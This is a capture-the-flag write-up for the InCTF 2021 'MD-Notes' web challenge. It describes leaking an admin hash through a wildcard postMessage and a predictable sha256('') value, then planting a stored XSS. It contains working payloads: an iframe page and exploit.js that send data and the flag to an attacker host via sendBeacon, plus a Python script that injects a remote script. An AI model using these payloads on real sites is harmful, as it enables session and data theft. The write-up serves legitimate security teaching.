---
title: 'MD-Notes - InCTF Internationals 2021'
date: 2021-08-14 12:01:43
author: Yadhu Krishna M
author_url: https://twitter.com/YadhuKrishna_
categories:
 - Web Exploitation
tags:
 - XSS
 - JavaScript
 - InCTFi
---

**tl;dr**

+ Leak admin's hash using wildcard target origin in postMessage or by calculating `sha256('')`.
+ Create an XSS payload to read `/api/flag` and send it to attacker server.

<!--more--> 

**Challenge Author:** [imp3ri0n](https://twitter.com/YadhuKrishna_/)
**Challenge Points:** 100
**Challenge Solves**: 46

## Introduction

A brief write-up of MD-Notes, web exploitation challenge from InCTF Internationals 2021. The source code of the challenge can be downloaded from [here](source-code.zip).

We're provided with a markdown editor and an admin bot. The admin bot visits any link that is provided to it.

## Initial Analysis

![Screenshot](md-notes.png)

When a note is previewed, a POST request is made to `/api/filter` which returns a Hash, sanitized text and raw input. Preview is rendered inside an iframe using the following script. 

```javascript=
window.addEventListener("message", (event) => {
    console.log("Previewing..")
	let raw = event.data

	fetch("/api/filter", {
		method: "POST",
		credentials: "include",
		body: JSON.stringify({
			raw: raw
		})
	})
    .then(resp => resp.json())
	.then(response => {
		console.log("Filtered")
		document.body.innerHTML = response.Sanitized
		window.parent.postMessage(response, "*"); 
	}); 
}, false);
```

The preview iframe sends back the filtered input (note that it contains `Hash`). 

To save the post, a request has to be made to `/api/create`, which contains the hash and raw body. The created post is encoded if the hash does not belong to the admin.

```go=    
    // Omitted for brevity
    if createpost.Hash != CONFIG.admin_hash {
        id , _ := uuid.NewV4()
        bucket = id.String()
        data = string(markdown.ToHTML([]byte(sanitize(data)), nil, nil))
    } else {
        data = string(markdown.ToHTML([]byte(data), nil, nil))
    }
```

There's a `/_debug` endpoint that returns the `admin_bucket`. There is also `/api/flag` endpoint which returns the flag if admin token (which is in turn the flag) matches the cookie value. 

## Exploit

From the above observations, we can conclude that:

1. We require XSS to read `/api/flag`.
2. XSS is possible only with the admin's hash.

### Retrieving the Hash

The admin's hash can be retrieved in two ways:

+ By sending the bot to an attacker controlled website that contains an iframe pointing to [/demo](http://web.challenge.bi0s.in:5432/demo) and sending a postMessage to it. 

```html =
    <iframe src="http://web.challenge.bi0s.in:5432/demo" id="frame"></iframe>
    <script>
        let frame = document.getElementById("frame");
        frame.onload = function ()
        {
            frame.contentWindow.postMessage("hello", "*");
        }

        window.addEventListener("message", (event) => {
            navigator.sendBeacon("https://webhookurl/", JSON.stringify(event.data))
        })  
    </script>
```
+ The value of `hash` is always equal to `sha256('')` since `CONFIG.admin_token` will be undefined. That means, the hash will be `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`. 

### Creating an XSS payload

Once the hash is retrieved, it is trivial to create a post that contains an XSS payload. 

```bash
curl 'http://web.challenge.bi0s.in:5432/api/create' \
-H 'Cookie: Token=a701285e-2860-4017-6d2b-24865006ba16;' \
--data-raw '{"Hash":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","Raw":"<script>alert(1)</script>"}'
```

Sending a request as above creates a post in admin's bucket. 

```json
{"Status":"success", "PostId":"67912087343", "Bucket":"b5cd7ae0-7b50-7ae0-7ae0-47a03b473015"}
```

## Final Payload

exploit.py
```python=
import requests
from hashlib import sha256

url = "http://web.challenge.bi0s.in:5432"

payload = f"<script src='http://hostname/exploit.js'></script>"

hash = sha256(b'').hexdigest()
cookies = {"Token": "a701285e-2860-4017-6d2b-24865006ba16"}
data = {"Hash": hash, "Raw" : payload }
response = requests.post(url + "/api/create", cookies=cookies, json=data).json()

print ("Exploit created at: ", f'{url}/{response["Bucket"]}/{response["PostId"]}')

```

exploit.js
```javascript=
fetch("/api/flag",{credentials:'include'})
.then((r)=>r.text())
.then((d)=>{
        navigator.sendBeacon("http://hostname/", d)
})
```

## Flag

```
inctf{8d739_csrf_is_fun_3d587ec9}
```
